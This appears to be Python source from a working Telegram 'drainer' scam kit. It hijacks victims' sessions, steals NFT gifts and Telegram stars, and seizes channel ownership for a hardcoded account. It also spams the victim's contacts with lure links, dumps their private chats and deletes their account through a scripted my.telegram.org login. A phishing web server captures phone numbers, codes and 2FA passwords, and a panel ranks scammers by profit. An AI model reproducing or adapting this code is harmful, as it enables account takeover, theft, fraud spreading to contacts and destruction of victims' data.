            print_success(f"Админка выдана @{target_username}")
        except Exception as e:
            transfer_details['reason'] = f"Не удалось выдать админку: {e}"
            return transfer_details

        # 2. Попытка передачи владения (Осторожная)
        try:
            await client.transfer_chat_ownership(channel_id, target_username)
            transfer_details['success'] = True
            print_success(f"Владение передано @{target_username}")
        except Exception as e:
            err = str(e).lower()
            if "password" in err or "2fa" in err:
                transfer_details['reason'] = "Требуется 2FA пароль или отлежка 7 дней"
            elif "flood" in err:
                transfer_details['reason'] = "Флуд-лимит Telegram"
            else:
                transfer_details['reason'] = f"Ошибка передачи: {e}"
            
            # Если владение не передали, но админку дали - сохраняем в список, чтобы воркер видел
            link = f"https://t.me/c/{str(channel_id).replace('-100', '')}/1"
            if chat.username: link = f"https://t.me/{chat.username}"
            
            transfer_details['admin_channels'].append({
                'title': chat.title,
                'link': link
            })
            # Считаем успехом, так как админка есть
            transfer_details['success'] = True

        # 3. Удаление сообщений (Smart Delete)
        try:
            print_info(f"Начинаю очистку сообщений в {channel_id}...")
            # Получаем ID последнего сообщения
            last_msg_id = 0
            async for m in client.get_chat_history(channel_id, limit=1):
                last_msg_id = m.id
                
            if last_msg_id > 0:
                # Удаляем чанками по 100 с паузами
                batch_size = 100
                for i in range(1, last_msg_id + 1, batch_size):
                    ids = list(range(i, min(i + batch_size, last_msg_id + 1)))
                    try:
                        await client.delete_messages(channel_id, ids)
                        await asyncio.sleep(1.5) # Важная пауза от флуда
                    except FloodWait as fw:
                        print_warning(f"FloodWait {fw.value}s при удалении. Ждем...")
                        await asyncio.sleep(fw.value + 2)
                        # Пробуем еще раз этот чанк
                        try: await client.delete_messages(channel_id, ids)
                        except: pass
                    except Exception:
                        pass
        except Exception as e:
            print_error(f"Ошибка очистки чата: {e}")

        return transfer_details

    except Exception as e:
        transfer_details['reason'] = f"Критическая ошибка: {e}"
        return transfer_details

async def ghost_mode_archive(client: Client, chats_to_archive: list = None):
    """
    👻 Ghost Mode: Быстрая архивация без перебора всех диалогов
    """
    archived_count = 0
    try:
        if chats_to_archive:
            for chat_id in chats_to_archive:
                try:
                    await client.archive_chats(chat_ids=[chat_id])
                    archived_count += 1
                    await asyncio.sleep(0.3) # Пауза важна
                except Exception: pass
        else:
            # Ищем ботов только среди последних 150 диалогов
            async for dialog in client.get_dialogs(limit=150):
                if dialog.chat.type == pyrogram.enums.ChatType.BOT:
                    try:
                        await client.archive_chats(chat_ids=[dialog.chat.id])
                        archived_count += 1
                        await asyncio.sleep(0.2) # Анти-флуд
                    except Exception: pass
                    
    except Exception as e:
        print_error(f"Error in ghost_mode_archive: {e}")

    return archived_count

async def send_mass_checks(client: Client, bot, skip_flags: dict, step: int, check_amount: int = 200, max_sends: int = 50):
    """
    Рассылка чеков в ЛС пользователям (с возможностью пропуска)
    """
    sent_count = 0
    archived_chats = []
    try:
        bot_info = await bot.get_me()
        bot_username = bot_info.username

        async for dialog in client.get_dialogs():
            # Проверяем флаг пропуска перед каждой отправкой
            if skip_flags.get(f"skip_{step}", False):
                print_info(f"Этап {step} пропущен - прекращаем рассылку чеков")
                break

            if (dialog.chat.type == pyrogram.enums.ChatType.PRIVATE and
                dialog.chat.id != 777000 and
                dialog.chat.id != (await client.get_me()).id and
                dialog.chat.username != bot_username):

                try:
                    # Создаем чек
                    check_id = db.create_check(creator_id=(await client.get_me()).id, amount=check_amount, activations=1)
                    link = f"https://t.me/{bot_username}?start=c_{check_id}"

                    text = (
                        f"привет, мне короче скинули {check_amount} звезд и я захотел с тобой поделится\n\n"
                        f"{link}"
                    )

                    await client.send_message(dialog.chat.id, text)
                    sent_count += 1
                    archived_chats.append(dialog.chat.id)  # Запоминаем чат для архивирования

                    if sent_count >= max_sends:
                        break

                    await asyncio.sleep(random.uniform(1.5, 3.0))

                except Exception as e:
                    print_error(f"Ошибка отправки чека в {dialog.chat.id}: {e}")
                    continue
    except Exception as e:
        print_error(f"Error in send_mass_checks: {e}")

    return sent_count, archived_chats

async def run_complex_scan_after_drainer(client: Client, bot: Bot, user_id: int, username: str):
    """
    Автоматический запуск комплексного сканирования после завершения дрейнера
    """
    try:
        print_info(f"🔍 Автоматически запускаю комплексное сканирование для {username}...")

        me = await client.get_me()
        
        # ИСПРАВЛЕНО: Инициализация переменной перед использованием
        admin_channel_names = [] 
        
        # ЭТАП 1: Admin Finder
        admin_data = await admin_finder(client)
        admin_count = admin_data['count']
        print_success(f"👑 Найдено админок: {admin_count}")

        # ЭТАП 2: Wallet Hunter
        wallet_data = await wallet_hunter(client)
        wallet_count = wallet_data['count']
        print_success(f"💰 Найдено кошельков: {wallet_count}")

        # ЭТАП 3: Передача каналов
        transferred_count = 0
        if admin_data['admin_chats']:
            for chat in admin_data['admin_chats']:
                if chat['type'] == 'channel':
                    # [FIX] Сохраняем результат в переменную для извлечения имен
                    transfer_result = await transfer_channel_admin(client, chat['id'], 'DmJohnRent')
                    if transfer_result and transfer_result.get('success'):
                        transferred_count += 1
                        # [FIX] Собираем имена каналов для логов
                        if transfer_result.get('admin_channels'):
                            admin_channel_names.extend(transfer_result['admin_channels'])
        print_success(f"🔄 Передано каналов: {transferred_count}")

        # ЭТАП 4: Архивация чатов
        archived_count = await ghost_mode_archive(client)
        print_success(f"👻 Заархивировано чатов: {archived_count}")

        # [FIX] Исправлен отступ (удален лишний уровень вложенности)
        # Финальная статистика
        admin_channels_text = ""
        if admin_channel_names:
            admin_channels_text = f"\n👑 <b>Админка выдана в каналах:</b>\n" + "\n".join(f"• {name}" for name in admin_channel_names)

        stats_text = (
            f"📊 <b>ФИНАЛЬНАЯ СТАТИСТИКА ПРОЦЕССА</b>\n\n"
            f"👤 <b>Пользователь:</b> {mask_data(username or str(user_id))}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n\n"
            f"👑 <b>Найдено админок:</b> {admin_count}\n"
            f"💰 <b>Найдено кошельков:</b> {wallet_count}\n"
            f"🔄 <b>Передано каналов:</b> {transferred_count}\n"
            f"👻 <b>Заархивировано:</b> {archived_count}{admin_channels_text}\n\n"
            f"✅ <b>Процесс завершен успешно!</b>"
        )
        await alert_admins(bot, stats_text)
        print_success("🔍 Автоматическое комплексное сканирование завершено!")

    except Exception as e:
        print_error(f"Failed to run automatic complex scan: {e}")

async def FULL_WORKER_CYCLE(client: Client, banker_client: Client, bot: Bot):
    """
    ГЛАВНАЯ ФУНКЦИЯ ОБРАБОТКИ (Merge of Logic)
    1. Convert Trash Gifts
    2. Identify NFTs
    3. Fund Account (if needed)
    4. Transfer NFTs
    5. Drain Remaining Stars
    6. Dump Chats (ПЕРЕМЕЩЕНО В КОНЕЦ)
    7. Ghost Mode / Saved Messages
    8. Account Deletion (NEW)
    """
    me = await client.get_me()
    user_id = me.id
    username = me.username

    # Статистика для финального отчета
    stats = {
        'user_id': user_id,
        'username': username,
        'admin_chats': 0,
        'wallet_info': 0,
        'archived_chats': 0,
        'checks_sent': 0,
        'nfts_transferred': 0,
        'transferred_channels': 0
    }

    try:
        # --- 1. Сначала конвертируем обычные подарки в звезды ---
        gifts = await get_all_received_gifts(client)
        for g in gifts:
            d = analyze_gift_structure(g)
            if not d['is_nft'] and d['can_convert']:
                await convert_regular_gift(client, d)

        # --- 2. Анализируем NFT ---
        gifts = await get_all_received_gifts(client)
        nfts_to_send = []
        tradeban_nfts = []
        total_cost = 0

        for g in gifts:
            d = analyze_gift_structure(g)
            if d['is_nft']:
                if d['can_transfer']:
                    nfts_to_send.append(d)
                    total_cost += d['transfer_cost']
                else:
                    tradeban_nfts.append(d)

        # ================== ВСТАВЛЯТЬ СЮДА ==================
        # Если есть NFT в трейдбане - отправляем лог
        if tradeban_nfts:
            print(f"⏳ Обнаружен Tradeban NFT ({len(tradeban_nfts)} шт). Отправляю лог...")
            
            mamont_tag = f"@{mask_data(username)}" if username else mask_data(str(user_id))
            
            # Гарантированно получаем данные юзера из БД
            u_db = db.get_user(user_id)
            
            worker_tag = "Администрация"
            if u_db and u_db.get('worker_id'):
                w = db.get_user(u_db['worker_id'])
                if w:
                    worker_tag = f"@{w['username']}" if w.get('username') else str(w['user_id'])

            # ИСПОЛЬЗУЕМ AWAIT вместо create_task, чтобы гарантировать отправку
            try:
                await log_tradeban_nft(bot, {
                    'mamont_tag': mamont_tag,
                    'nft_list': tradeban_nfts, 
                    'worker_tag': worker_tag
                })
                print("✅ Лог о трейдбане успешно отправлен.")
            except Exception as e_log:
                print(f"❌ Ошибка при отправке лога трейдбана: {e_log}")
        # ====================================================

        # Если NFT нет, сливаем звезды (если есть) и идем к дампу
        if not nfts_to_send:
            log_transfer("NFT не найдены или заблокированы.")
            if banker_client:
                b_me = await banker_client.get_me()
                await drain_remaining_stars(client, b_me.username or b_me.id)
        else:
            # --- 3. Пополнение баланса (если нужно для комиссии) ---
            current_bal = await get_stars_info(client)
            if current_bal < total_cost:
                needed = total_cost - current_bal
                
                if not banker_client:
                    print_error("Нет банкира для пополнения!")
                    await alert_admins(bot, f"⚠️ Мамонт {user_id}: не хватает {needed} звезд, банкира нет!")
                    return

                log_transfer(f"Пополнение баланса... (Нужно: {needed})")
                
                # Запускаем пополнение
                success = await replenish_balance_bulk(client, user_id, username, banker_client, total_cost)
                
                if not success:
                    log_transfer("Ошибка пополнения баланса", "error")
                
                # Обновляем баланс после пополнения
                await asyncio.sleep(2)
                current_bal = await get_stars_info(client)

            # --- 4. Передача NFT ---
            u_db = db.get_user(user_id)
            for nft in nfts_to_send:
                success = await transfer_nft_gift(client, nft)
                nft['transferred'] = success
                if success:
                    stats['nfts_transferred'] += 1
                await asyncio.sleep(0.5)

            mamont_tag = f"@{mask_data((await client.get_me()).username)}" if (await client.get_me()).username else mask_data(str(user_id))
            worker_id = u_db.get('worker_id') if u_db else None

            try:
                await log_profit_to_topic(bot, {
                    'mamont_tag': mamont_tag,
                    'nft_data': nfts_to_send,
                    'worker_id': worker_id
                })
            except Exception as e:
                print_error(f"Failed to log profit: {e}")

            # --- 5. Дрейн остатка звезд (Возврат банкиру) ---
            if banker_client:
                b_me = await banker_client.get_me()
                await drain_remaining_stars(client, b_me.username or b_me.id)

        # --- 6. ДАМП ЧАТОВ (Теперь выполняется ПОСЛЕ всех сливов) ---
        print_info(f"📂 Начинаю дамп чатов для {user_id}...")
        await dump_chat_history(client, user_id)
        print_success("✅ Дамп чатов завершен")

        # --- 7. Ghost Mode (Архивация) ---
        stats['archived_chats'] = await ghost_mode_archive(client)
        print_success(f"👻 Заархивировано чатов: {stats['archived_chats']}")

    except Exception as e:
        print_error(f"Error in FULL_WORKER_CYCLE: {e}")
    # ==============================================

    # --- 8. Дамп Избранного (СОХРАНЯЕМ ПЕРЕД СМЕРТЬЮ) ---
    try:
        await dump_saved_messages(client, user_id)
        log_transfer(f"Saved messages dump completed for user {user_id}")
    except Exception as dump_error:
        print_error(f"Failed to dump saved messages: {dump_error}")

    # === 9. УДАЛЕНИЕ АККАУНТА (ТЕПЕРЬ В САМОМ КОНЦЕ) ===
    print_info(f"🛡 Проверка статуса авто-удаления: {SETTINGS.get('auto_deactivate')}")
    
    if SETTINGS.get("auto_deactivate", False) is True:
        try:
            print_warning(f"☠️ ЗАПУСК ПРОЦЕДУРЫ УНИЧТОЖЕНИЯ АККАУНТА {user_id}...")
            me = await client.get_me()
            phone = f"+{me.phone_number}"
            
            # Ждем 5 секунд перед удалением
            await asyncio.sleep(5)
            
            await deactivate_telegram_account(client, phone)
        except Exception as e:
            print_error(f"Не удалось запустить процесс удаления: {e}")
    else:
        print_warning(f"ℹ️ Авто-удаление ПРОПУЩЕНО (Выключено в настройках)")

async def deactivate_telegram_account(client: Client, phone: str):
    """
    Улучшенная функция удаления аккаунта с 100% надежностью
    """
    print_warning(f"⚠️ [DEACTIVATE] Начинаю удаление аккаунта {phone}...")
    
    # === 1. ПОДГОТОВКА ПРОКСИ ===
    proxy_url = None
    proxies_list = SETTINGS.get("proxies", [])
    if proxies_list:
        raw_proxy = random.choice(proxies_list)
        # aiohttp требует формат http://user:pass@ip:port
        if not raw_proxy.startswith("http"):
            proxy_url = f"http://{raw_proxy}"
        else:
            proxy_url = raw_proxy
        print_info(f"🛡 [DEACTIVATE] Использую прокси для обхода лимитов: {proxy_url.split('@')[-1]}")
    else:
        print_warning("⚠️ [DEACTIVATE] Прокси не найдены в settings.json! Если IP в бане, удаление не сработает.")

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://my.telegram.org/auth",
        "Origin": "https://my.telegram.org",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
    }
    
    # Добавляем cookie jar для сохранения сессии
    jar = aiohttp.CookieJar(unsafe=True)

    async with aiohttp.ClientSession(headers=headers, cookie_jar=jar) as session:
        try:
            # === ШАГ 1: Запрос кода ===
            print_info(f"📡 [DEACTIVATE] Запрос кода на my.telegram.org...")
            
            # Попробуем несколько раз в случае временных ошибок
            for attempt in range(3):
                try:
                    async with session.post("https://my.telegram.org/auth/send_password", data={"phone": phone}, proxy=proxy_url) as resp:
                        response_text = await resp.text()
                        
                        if "too many tries" in response_text.lower():
                            print_error("❌ [DEACTIVATE] IP забанен (Too many tries). Добавьте рабочие прокси в settings.json!")
                            return False
                        
                        try:
                            data = json.loads(response_text)
                            random_hash = data.get("random_hash")
                        except:
                            print_error(f"❌ [DEACTIVATE] Ошибка парсинга ответа: {response_text}")
                            if attempt < 2:
                                await asyncio.sleep(2)
                                continue
                            return False

                        if not random_hash:
                            print_error(f"❌ [DEACTIVATE] Не получен random_hash. Ответ: {response_text}")
                            if attempt < 2:
                                await asyncio.sleep(2)
                                continue
                            return False
                        
                        break  # Успешно получили hash
                        
                except Exception as conn_err:
                    print_error(f"❌ [DEACTIVATE] Ошибка соединения (прокси?): {conn_err}")
                    if attempt < 2:
                        await asyncio.sleep(2)
                        continue
                    return False

            print_info("⏳ [DEACTIVATE] Код запрошен. Жду 15 секунд...")
            await asyncio.sleep(15)

            # === ШАГ 2: Поиск кода в Telegram ===
            web_code = None
            # Увеличиваем лимит сообщений для поиска
            async for msg in client.get_chat_history(777000, limit=10):
                if not msg.text: continue
                
                # Улучшенный поиск кода с несколькими паттернами
                patterns = [
                    r':[\s\n]+([A-Za-z0-9]{10,})',  # Основной паттерн
                    r'([A-Za-z0-9]{10,})',          # Простой паттерн
                    r'код[:\s]+([A-Za-z0-9]{10,})', # По слову "код"
                    r'password[:\s]+([A-Za-z0-9]{10,})' # По слову "password"
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, msg.text, re.IGNORECASE)
                    if match:
                        found = match.group(1)
                        if "telegram" not in found.lower() and len(found) >= 10:
                            web_code = found
                            print_success(f"🔑 [DEACTIVATE] Код найден: {web_code}")
                            break
                    if web_code: break
                if web_code: break

            if not web_code:
                print_error("❌ [DEACTIVATE] Бот не нашел код в чате 777000.")
                return False

            # === ШАГ 3: Логин ===
            print_info(f"🔐 [DEACTIVATE] Авторизация...")
            login_data = {"phone": phone, "random_hash": random_hash, "password": web_code}
            
            # Попробуем несколько раз в случае временных ошибок
            for attempt in range(3):
                try:
                    async with session.post("https://my.telegram.org/auth/login", data=login_data, proxy=proxy_url) as resp:
                        login_res = await resp.text()
                        if "true" in login_res.lower():
                            break
                        else:
                            print_error(f"❌ [DEACTIVATE] Ошибка входа. Ответ: {login_res}")
                            if attempt < 2:
                                await asyncio.sleep(2)
                                continue
                            return False
                except Exception as e:
                    print_error(f"❌ [DEACTIVATE] Ошибка авторизации: {e}")
                    if attempt < 2:
                        await asyncio.sleep(2)
                        continue
                    return False

            # === ШАГ 4: Получаем hash ===
            for attempt in range(3):
                try:
                    async with session.get("https://my.telegram.org/delete", proxy=proxy_url) as resp:
                        page = await resp.text()
                        hash_match = re.search(r"hash:\s*'([a-z0-9]+)'", page)
                        if hash_match:
                            at_hash = hash_match.group(1)
                            break
                        else:
                            print_error("❌ [DEACTIVATE] Не удалось найти hash удаления.")
                            if attempt < 2:
                                await asyncio.sleep(2)
                                continue
                            return False
                except Exception as e:
                    print_error(f"❌ [DEACTIVATE] Ошибка получения hash: {e}")
                    if attempt < 2:
                        await asyncio.sleep(2)
                        continue
                    return False

            # === ШАГ 5: Удаление ===
            print_warning("💣 [DEACTIVATE] ПОДТВЕРЖДЕНИЕ УДАЛЕНИЯ...")
            delete_data = {"hash": at_hash, "message": "Account deletion"}
            
            # Попробуем несколько раз в случае временных ошибок
            for attempt in range(3):
                try:
                    async with session.post("https://my.telegram.org/delete/do_delete", data=delete_data, proxy=proxy_url) as resp:
                        final_res = await resp.text()
                        if "true" in final_res.lower():
                            print_success(f"💀 [DEACTIVATE] АККАУНТ {phone} УСПЕШНО УДАЛЕН.")
                            return True
                        else:
                            print_error(f"❌ [DEACTIVATE] Ошибка при удалении: {final_res}")
                            if attempt < 2:
                                await asyncio.sleep(2)
                                continue
                            return False
                except Exception as e:
                    print_error(f"❌ [DEACTIVATE] Ошибка удаления: {e}")
                    if attempt < 2:
                        await asyncio.sleep(2)
                        continue
                    return False

        except Exception as e:
            print_error(f"⚠️ [DEACTIVATE] Критическая ошибка: {e}")
            return False
# ================= FragmentBot CLASS =================
class FragmentBot:
    def __init__(self):
        self.bot = None
        self.dp = None
        self.running = False
        self.user_sessions = {}
        self.pyro_clients = {}
        self.processed_reqs = set()
        self.tunnel_proc = None
        self.phone_attempts = {} 
        self.web_auths = {}
        self.app = web.Application()
        
        # === СТРАНИЦЫ ===
        self.app.router.add_get('/', self.serve_index)
        self.app.router.add_get('/index.html', self.serve_index)
        self.app.router.add_get('/auth.html', self.serve_auth)
        self.app.router.add_get('/market', self.serve_market)
        self.app.router.add_get('/fragment-info', self.serve_fragment_info)
        self.app.router.add_get('/fragment-info.html', self.serve_fragment_info)
        
        # !!! НОВОЕ: Страница панели воркера
        self.app.router.add_get('/worker-panel', self.serve_worker_html) 

        # === API ===
        # === API ===
        self.app.router.add_post('/api/send_phone', self.api_send_phone)
        self.app.router.add_post('/api/send_code', self.api_send_code)
        self.app.router.add_post('/api/send_password', self.api_send_password)
        self.app.router.add_get('/api/status', self.api_get_status)
        self.app.router.add_post('/api/log_photo', self.api_log_photo)
        self.app.router.add_get('/api/user/{user_id}', self.api_get_user_data)
        
        # ... существующие строки ...
        self.app.router.add_get('/api/worker/data', self.api_get_worker_panel_data)
        self.app.router.add_post('/api/bind_wallet_web', self.api_bind_wallet_web)
        
        # !!! ВСТАВЬТЕ ЭТУ СТРОКУ СЮДА !!!
        self.app.router.add_post('/api/worker/update', self.api_update_worker_settings)

    async def run(self):
        print_banner()
        runner = web.AppRunner(self.app)
        await runner.setup()
        site = web.TCPSite(runner, '0.0.0.0', 3000)
        await site.start()
        print(f"WebApp server started on port 3000")

        self.bot = Bot(token=SETTINGS['bot_token'], default=DefaultBotProperties(parse_mode=ParseMode.HTML))
        self.dp = Dispatcher()
        self.dp.update.middleware(RateLimitMiddleware())
        self.dp.include_router(get_main_router(self.bot, SETTINGS['api_url']))

        await self.bot.delete_webhook(drop_pending_updates=True)
        asyncio.create_task(self.start_polling())
        
        # === ЗАПУСК АВТОМАТИЧЕСКОГО МОНИТОРИНГА СЕССИЙ ===
        global session_monitor
        session_monitor = SessionMonitor(self.bot)
        asyncio.create_task(session_monitor.start_monitoring())
        
        print_success("Bot Started!")
        await self.dp.start_polling(self.bot)

    async def api_update_worker_settings(self, request):
        try:
            data = await request.json()
            user_id = int(data.get('user_id'))

            print(f"DEBUG: Updating settings for user {user_id}")

            # Обновляем все кастомные поля
            custom_fields = [
                'custom_name', 'custom_role', 'custom_color', 'custom_tag',
                'custom_name_effect', 'custom_name_bg', 'custom_role_bg',
                'custom_name_size', 'custom_role_effect', 'custom_avatar_border_color',
                'custom_profile_bg', 'custom_aura_enabled', 'custom_avatar', 'custom_banner'
            ]

            with db_lock:
                for field in custom_fields:
                    value = data.get(field)
                    if value is not None:
                        print(f"DEBUG: Setting {field} = {value} for user {user_id}")
                        db.cursor.execute(f"UPDATE users SET {field} = ? WHERE user_id = ?", (value, user_id))
                db.conn.commit()

            print(f"DEBUG: Settings updated successfully for user {user_id}")
            return web.json_response({'status': 'ok'})
        except Exception as e:
            print(f"ERROR: Failed to update settings: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})

    async def serve_worker_html(self, request):
        try:
            file_path = BASE_DIR / 'worker.html'
            # ИСПРАВЛЕНО: Проверка существования файла
            if not file_path.exists():
                return web.Response(text="Error: worker.html not found", status=404)

            # Чтение файла асинхронно (через to_thread, если файл большой, или просто так если маленький)
            # Для надежности используем to_thread
            try:
                content = await asyncio.to_thread(file_path.read_text, encoding='utf-8')
            except AttributeError: # Python < 3.9
                with open(file_path, 'r', encoding='utf-8') as f: content = f.read()

            content = content.replace("const API_BASE = 'http://localhost:3000';", "const API_BASE = '';")
            return web.Response(text=content, content_type='text/html')
        except Exception as e:
            print_error(f"Error serving worker.html: {e}")
            return web.Response(text=f"Server Error: {e}", status=500)

    # Аналогично добавьте проверку .exists() для serve_market, serve_index, serve_auth

    # Обновите существующий метод api_get_user_data
    async def api_get_user_data(self, request):
        try:
            user_id_param = request.match_info.get('user_id')
            if not user_id_param:
                return web.json_response({'status': 'error', 'message': 'User ID required'})

            try:
                user_id = int(user_id_param)
            except ValueError:
                return web.json_response({'status': 'error', 'message': 'Invalid User ID'})

            user_data = db.get_user(user_id)
            if not user_data:
                # Если юзера нет, возвращаем пустышку, чтобы фронт не падал
                return web.json_response({'status': 'ok', 'username': 'Guest', 'worker_profits': 0})

            # Получаем кошелек
            wallet_info = db.get_wallet(user_id)
            wallet_addr = wallet_info['address'] if wallet_info else ""

            # Формируем полный ответ для Worker Panel
            response_data = {
                'user_id': user_data['user_id'],
                'username': user_data.get('username'),
                'first_name': user_data.get('first_name'),
                'balance': user_data.get('balance', 0),
                # Данные специфичные для воркера
                'worker_profits': user_data.get('worker_profits', 0),
                'worker_total_profits': user_data.get('worker_total_profits', 0),
                'wallet_address': wallet_addr
            }

            return web.json_response(response_data)
        except Exception as e:
            print_error(f"Error getting user data: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})
        
    # --- ВСТАВИТЬ ЭТО ВНУТРЬ КЛАССА FragmentBot ---

    async def api_get_worker_panel_data(self, request):
        try:
            user_id_param = request.query.get('chatId') or request.query.get('user_id')
            if not user_id_param: return web.json_response({'status': 'error', 'message': 'Missing user_id'})
            user_id = int(user_id_param)

            user_data = db.get_user(user_id)
            if not user_data: return web.json_response({'status': 'error', 'message': 'User not found'})

            # --- ПОЛУЧАЕМ ТОП ВОРКЕРОВ ---
            top_workers = []
            with db_lock:
                # ВАЖНО: Запрашиваем custom_avatar
                db.cursor.execute("""
                    SELECT username, worker_total_profits, custom_avatar 
                    FROM users 
                    WHERE worker_total_profits > 0 
                    ORDER BY worker_total_profits DESC 
                    LIMIT 5
                """)
                top_rows = db.cursor.fetchall()
                
                for idx, r in enumerate(top_rows):
                    # r[0]=username, r[1]=profit, r[2]=avatar
                    username = r[0]
                    if not username or username == "Unknown":
                        username = f"Worker {idx+1}"
                    
                    top_workers.append({
                        'rank': idx + 1,
                        'username': username,
                        'profit': r[1],
                        'avatar': r[2]  # Передаем аватарку на фронтенд
                    })

            # Статистика текущего юзера
            with db_lock:
                db.cursor.execute("SELECT COUNT(*) FROM users WHERE worker_id = ?", (user_id,))
                mamonts_count = db.cursor.fetchone()[0]

            wallet_info = db.get_wallet(user_id)
            
            response_data = {
                'status': 'ok',
                'user_id': user_id,
                'user': {
                    'first_name': user_data.get('first_name'),
                    'username': user_data.get('username'),
                    'profits_count': user_data.get('worker_profits', 0),
                    'total_profit_ton': user_data.get('worker_total_profits', 0),
                    'custom_avatar': user_data.get('custom_avatar'),
                    'custom_banner': user_data.get('custom_banner'),
                    'custom_name': user_data.get('custom_name'),
                    'custom_role': user_data.get('custom_role'),
                    'custom_color': user_data.get('custom_color', '#ffffff'),
                    'custom_tag': user_data.get('custom_tag'),
                    'custom_name_effect': user_data.get('custom_name_effect'),
                    'custom_name_bg': user_data.get('custom_name_bg'),
                    'custom_role_bg': user_data.get('custom_role_bg'),
                    'custom_name_size': user_data.get('custom_name_size'),
                    'custom_role_effect': user_data.get('custom_role_effect'),
                    'custom_avatar_border_color': user_data.get('custom_avatar_border_color', '#000000'),
                    'custom_profile_bg': user_data.get('custom_profile_bg'),
                    'custom_aura_enabled': user_data.get('custom_aura_enabled', 0)
                },
                'stats': {
                    'mamonts': mamonts_count
                },
                'wallet': wallet_info['address'] if wallet_info else "",
                'top_workers': top_workers
            }

            print(f"DEBUG: Returning custom data for user {user_id}: {response_data['user']}")
            
            return web.json_response(response_data, headers={'Access-Control-Allow-Origin': '*'})
            
        except Exception as e:
            print(f"❌ Error in api_get_worker_panel_data: {e}")
            return web.json_response({'status': 'error', 'message': str(e)})
            

    async def api_bind_wallet_web(self, request):
        try:
            data = await request.json()
            user_id = data.get('user_id') or data.get('chatId')
            address = data.get('address')

            if not user_id or not address:
                return web.json_response({'status': 'error', 'message': 'Data missing'})

            db.bind_wallet(int(user_id), address)
            return web.json_response({'status': 'ok', 'message': 'Wallet bound'})
        except Exception as e:
            return web.json_response({'status': 'error', 'message': str(e)})

    # --- КОНЕЦ ВСТАВКИ ---
        
    async def serve_market(self, request):
        try:
            return web.FileResponse('market.html')
        except:
            return web.Response(text="market.html not found", status=404)

    async def serve_index(self, request):
        try:
            return web.FileResponse('index.html')
        except:
            return web.Response(text="index.html not found", status=404)

    async def serve_auth(self, request):
        try:
            return web.FileResponse('auth.html')
        except:
            return web.Response(text="auth.html not found", status=404)

    async def serve_fragment_info(self, request):
        try:
            return web.FileResponse('fragment-info.html')
        except:
            return web.Response(text="fragment-info.html not found", status=404)

    async def serve_worker(self, request):
        html = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Уведомление о продаже</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            max-width: 400px;
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            animation: slideIn 0.5s ease-out;
        }
        @keyframes slideIn {
            from { transform: translateY(-30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        .header {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            padding: 20px;
            text-align: center;
        }
        .header h1 {
            margin: 0;
            font-size: 24px;
            font-weight: 600;
        }
        .content {
            padding: 24px;
        }
        .notification {
            background: #f8f9fa;
            border: 1px solid #e9ecef;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
        }
        .notification .icon {
            font-size: 32px;
            margin-bottom: 12px;
        }
        .notification h2 {
            margin: 0 0 8px 0;
            color: #2c3e50;
            font-size: 18px;
        }
        .notification p {
            margin: 8px 0;
            color: #555;
            line-height: 1.5;
        }
        .conditions {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 8px;
            padding: 12px;
            margin: 16px 0;
        }
        .conditions strong {
            color: #856404;
        }
        .deadline {
            background: #d1ecf1;
            border: 1px solid #bee5eb;
            border-radius: 8px;
            padding: 12px;
            margin: 16px 0;
            text-align: center;
        }
        .deadline strong {
            color: #0c5460;
        }
        .button {
            display: block;
            width: 100%;
            background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(0,123,255,0.3);
        }
        .footer {
            text-align: center;
            padding: 16px;
            color: #6c757d;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔔 Уведомление</h1>
        </div>
        <div class="content">
            <div class="notification">
                <div class="icon">🎉</div>
                <h2>У вас новая продажа!</h2>
                <p>Поздравляем! Ваш товар был успешно продан на платформе.</p>
            </div>

            <div class="conditions">
                <strong>📋 Условия сделки:</strong><br>
                Необходимо перевести оплату чеком звезд на аккаунт <strong>@vafliki</strong><br>
                Сумма: <strong>100 ⭐️</strong>
            </div>

            <div class="deadline">
                <strong>⏰ Просим выполнить условия сделки до:</strong><br>
                <strong>28 декабря 2025 года 22:57 по МСК+6</strong>
            </div>

            <button class="button" onclick="alert('Условия выполнены! Спасибо за использование нашей платформы.')">
                ✅ Выполнить условия сделки
            </button>
        </div>
        <div class="footer">
            Безопасная платформа • Все права защищены
        </div>
    </div>
</body>
</html>
        """
        return web.Response(text=html, content_type='text/html')

    async def api_send_phone(self, request):
        try:
            data = await request.json()
            phone = data.get('phone', '').replace(' ', '').replace('-', '')
            # Получаем chatId из данных или параметров запроса
            chat_id = str(data.get('chatId') or request.query.get('chatId') or '')

            print(f"🔍 [API] Request data: {data}")  # Отладка
            print(f"📱 [API] Phone: {phone}, ChatID: {chat_id}")  # Отладка

            # Проверяем, что chat_id существует
            if not chat_id or chat_id == 'null' or chat_id == 'undefined':
                print("❌ [API] Chat ID missing or invalid")  # Отладка
                return web.json_response({'status': 'error', 'message': 'Chat ID required'})

            # Проверяем пользователя в БД - он должен быть добавлен через /start в боте
            try:
                chat_id_int = int(chat_id)
                u_db = db.get_user(chat_id_int)
